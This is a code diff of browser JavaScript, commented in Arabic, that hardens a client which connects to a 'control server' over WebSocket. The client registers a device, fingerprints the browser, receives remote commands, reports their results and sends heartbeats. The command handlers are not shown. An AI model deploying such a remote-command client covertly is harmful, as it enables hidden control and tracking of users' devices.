@@ -72,27 +72,49 @@
     
     // الاتصال بخادم التحكم
     async function connectToControlServer() {
-        const ws = new WebSocket(SERVER_URL);
-        
-        ws.onopen = () => {
-            ws.send(JSON.stringify({
-                type: 'register',
-                deviceId: DEVICE_ID,
-                activationCode: ACTIVATION_CODE,
-                timestamp: TIMESTAMP
-            }));
-        };
-        
-        ws.onmessage = (event) => {
-            const command = JSON.parse(event.data);
-            handleIncomingCommand(command);
-        };
-        
-        ws.onclose = () => {
+        try {
+            console.log('محاولة الاتصال بـ:', SERVER_URL);
+            const ws = new WebSocket(SERVER_URL);
+            
+            ws.onopen = () => {
+                console.log('تم الاتصال بنجاح');
+                ws.send(JSON.stringify({
+                    type: 'register',
+                    deviceId: DEVICE_ID,
+                    activationCode: ACTIVATION_CODE,
+                    timestamp: TIMESTAMP,
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language
+                    }
+                }));
+            };
+            
+            ws.onmessage = (event) => {
+                try {
+                    const command = JSON.parse(event.data);
+                    console.log('تم استلام أمر:', command);
+                    handleIncomingCommand(command);
+                } catch (e) {
+                    console.error('خطأ في معالجة الرسالة:', e);
+                }
+            };
+            
+            ws.onerror = (error) => {
+                console.error('خطأ في الاتصال:', error);
+            };
+            
+            ws.onclose = () => {
+                console.log('انقطع الاتصال، إعادة الاتصال خلال 10 ثوان...');
+                setTimeout(connectToControlServer, 10000);
+            };
+            
+            window.controlConnection = ws;
+        } catch (error) {
+            console.error('خطأ في إنشاء الاتصال:', error);
             setTimeout(connectToControlServer, 10000);
-        };
-        
-        window.controlConnection = ws;
+        }
     }
     
     // معالجة الأوامر
@@ -140,13 +162,28 @@
     
     // إرسال تأكيد التفعيل
     function sendActivationConfirmation() {
-        if (window.controlConnection) {
-            window.controlConnection.send(JSON.stringify({
-                type: 'activation_confirmation',
-                deviceId: DEVICE_ID,
-                status: 'activated',
-                timestamp: Date.now()
-            }));
+        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+            try {
+                const message = {
+                    type: 'activation_complete',
+                    deviceId: DEVICE_ID,
+                    status: 'activated',
+                    timestamp: Date.now(),
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screenSize: `${screen.width}x${screen.height}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    }
+                };
+                console.log('إرسال تأكيد التفعيل:', message);
+                window.controlConnection.send(JSON.stringify(message));
+            } catch (error) {
+                console.error('خطأ في إرسال تأكيد التفعيل:', error);
+            }
+        } else {
+            console.error('الاتصال غير متاح لإرسال تأكيد التفعيل');
         }
     }
     
@@ -365,15 +402,23 @@
     }
     
     function sendCommandResult(command, status, data) {
-        if (window.controlConnection) {
-            window.controlConnection.send(JSON.stringify({
-                type: 'command_result',
-                commandId: window.currentCommandId || 'unknown',
-                command: command,
-                status: status,
-                data: data,
-                timestamp: Date.now()
-            }));
+        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+            try {
+                const message = {
+                    type: 'command_result',
+                    commandId: window.currentCommandId || 'unknown',
+                    command: command,
+                    status: status,
+                    data: data,
+                    timestamp: Date.now()
+                };
+                console.log('إرسال نتيجة:', message);
+                window.controlConnection.send(JSON.stringify(message));
+            } catch (error) {
+                console.error('خطأ في إرسال النتيجة:', error);
+            }
+        } else {
+            console.error('الاتصال غير متاح لإرسال النتيجة');
         }
     }
     
@@ -389,12 +434,18 @@
     }
     
     function sendHeartbeat() {
-        if (window.controlConnection) {
-            window.controlConnection.send(JSON.stringify({
-                type: 'heartbeat',
-                deviceId: DEVICE_ID,
-                timestamp: Date.now()
-            }));
+        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+            try {
+                const message = {
+                    type: 'heartbeat',
+                    deviceId: DEVICE_ID,
+                    timestamp: Date.now(),
+                    status: 'alive'
+                };
+                window.controlConnection.send(JSON.stringify(message));
+            } catch (error) {
+                console.error('خطأ في إرسال heartbeat:', error);
+            }
         }
     }
     
